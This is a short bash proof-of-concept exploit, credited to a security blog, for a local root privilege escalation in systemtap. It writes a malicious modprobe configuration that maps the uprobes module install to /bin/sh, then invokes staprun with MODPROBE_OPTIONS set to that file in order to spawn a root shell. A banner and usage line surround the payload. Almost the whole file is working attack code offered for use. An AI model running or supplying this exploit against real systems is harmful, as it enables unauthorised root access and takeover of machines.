#!/bin/bash
# By MiND for VOİXSEC.BLOGSPOT.COM !

if [ -n "$1" ]; then
        echo "Exploiting .........." 
        printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u $1
else 
        echo "
######  #######  #####     ####### #######    #    #     # 
#     # #     # #     #       #    #         # #   ##   ## 
#     # #     # #             #    #        #   #  # # # # 
######  #     # #             #    #####   #     # #  #  # 
#       #     # #             #    #       ####### #     # 
#       #     # #     #       #    #       #     # #     # 
#       #######  #####        #    ####### #     # #     #  
============================================================================
   Local Root Privilege Escalation Vulnerability in systemtap Exploit
                     VOİXSEC.BLOGSPOT.COM
============================================================================

Usage : ./p0c.sh <user> e.g. : ./p0c.sh mind
"
fi
